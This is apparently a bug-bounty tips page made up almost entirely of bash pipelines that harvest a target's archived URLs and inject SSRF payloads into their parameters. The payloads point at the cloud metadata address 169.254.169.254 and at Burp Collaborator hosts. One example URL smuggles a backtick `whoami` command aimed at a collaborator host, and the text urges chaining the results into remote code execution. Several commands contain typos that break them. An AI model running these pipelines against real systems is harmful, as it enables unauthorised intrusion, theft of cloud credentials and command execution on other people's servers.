
## Accessing SSRF metadata with automation by just using curl and bash

### TIPs 1

**Command for getting URLs**
```bash
waybackurls target.com | tee wayback.txt
gau -subs target.com | tee gau-urls.txt

cat wayback.txt gau-urls.txt | sort -u |anew | httpx -silent | qsreplace 'http://169.254.169.254/latest/meta-data/hostname' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
```
### TIPs 2
**Find Blind SSRF with automation by just using curl and bash**
```bash
waybaclurls target.com | tee wayback.txt
gau -subs target.com | tee gau-urls.txt

cat wayback.txt gau-urls.txt | sort -u | anew | httpx -silent | tee all-urls.txt
cat all-urls.txt | gf ssrf | tee ssrf.txt

# Finally we will use ffuf and burp collaboraotr client
cat ssrf.txt | qsreplace "YOUR BURP URL" | tee ssrf-fuzz.txt
ffuf -c ssrf-fuzz.txt -u FUZZ

```
### TIPs 3
```bash
#Gather URLs
gau -subs example.com 
waybackurls example.com
# Else You can use like this;
gau -subs example.com; subfinder -d example.com -silent |waybackurls | gf ssrf | sort -u | tee ssrf.txt

# Now we use fuzz the url for blind ssrf.
cat ssrf.txt | qsreplace 'http://YOUR.burpcolaborator.net' | tee ssrf-fuzz.txt
ffuf -c -w ssrf-fuzz.txt -u FUZZ -t 200
#Now we will check whetherwe get any http request hit on our burp collaborator server.
```
**If you get any http ping back on burpcolaborator then try to chain with RCE**

**http:/devtest.exampl.com/import/picture?next_image=http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net?`whoami`**


### TIPs 4

**Gather all target URLs using wayback,gau**
```bash
gau -subs example.com | tee gau-urls.txt
waybackurl example.com | tee wayback.txt
subfinder -d example.com -silent | waybackurls | sort -u | tee urls.txt
cat *.txt | grep "=" | sort -u | grep "?" | httpx -silent | tee fuzz.txt

#Here we use magicparameter sparing
xrags -a ~/magicparameter/ssrf.txt -l@ bash -c 'for url in$(cat fuzz.txt); do echo "$url&@=http://burpcolaborator.net";done' | httpx -silent http-proxy http://127.0.0.1:8080
```
#So that to fuzzing further to get AWS internal metadata for the vulnerable domain like these:

**This all method for Blind SSRF, You can increase this impact to chain with RCE.openredirect..etc vulnerability**









